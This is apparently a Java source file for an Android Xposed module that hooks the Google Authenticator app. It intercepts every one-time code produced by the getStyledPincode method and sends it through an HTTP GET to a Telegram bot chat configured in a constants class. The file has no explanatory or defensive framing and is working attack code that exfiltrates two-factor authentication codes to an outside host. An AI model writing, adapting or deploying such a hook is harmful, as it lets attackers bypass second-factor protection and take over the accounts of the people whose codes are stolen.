package com.josin.hackgoogleauthenticator.Xposed;

import android.content.Context;
import android.os.Bundle;

import com.josin.hackgoogleauthenticator.Utils.Constans;
import com.josin.hackgoogleauthenticator.Utils.LogUtils;
import com.lzy.okgo.OkGo;
import com.lzy.okgo.callback.StringCallback;
import com.lzy.okgo.model.Response;

import de.robv.android.xposed.XC_MethodHook;
import de.robv.android.xposed.XposedHelpers;
import de.robv.android.xposed.callbacks.XC_LoadPackage;
import okio.Okio;

public class HookGoogleAuthenticator {
    public void hook(final XC_LoadPackage.LoadPackageParam loadPackageParam, final Context context) throws ClassNotFoundException {
    XposedHelpers.findAndHookMethod(
        context
            .getClassLoader()
            .loadClass("com.google.android.apps.authenticator.AuthenticatorActivity"),
        "onCreate",
        Bundle.class,
        new XC_MethodHook() {
          @Override
          protected void afterHookedMethod(MethodHookParam param) throws Throwable {
            super.afterHookedMethod(param);
              LogUtils.d("AuthenticatorActivity hooked");

          }
        });
    XposedHelpers.findAndHookMethod(context.getClassLoader().loadClass("com.google.android.apps.authenticator.util.Utilities"), "getStyledPincode", String.class, new XC_MethodHook() {
        @Override
        protected void afterHookedMethod(MethodHookParam param) throws Throwable {
            super.afterHookedMethod(param);
            LogUtils.d("Utilities getStyledPincode://"+param.getResult());
            String result = (String) param.getResult();
            result = result.replaceAll(" ","");
            String url = Constans.telegram_robot_send(Constans.tg_chat_id,result);
            OkGo.<String>get(url)
                    .tag(this)
                    .execute(new StringCallback() {
                        @Override
                        public void onSuccess(Response<String> response) {
                            LogUtils.d("telegram_robot_send result://"+response.body());
                        }
                    });
        }
    });
    }
}
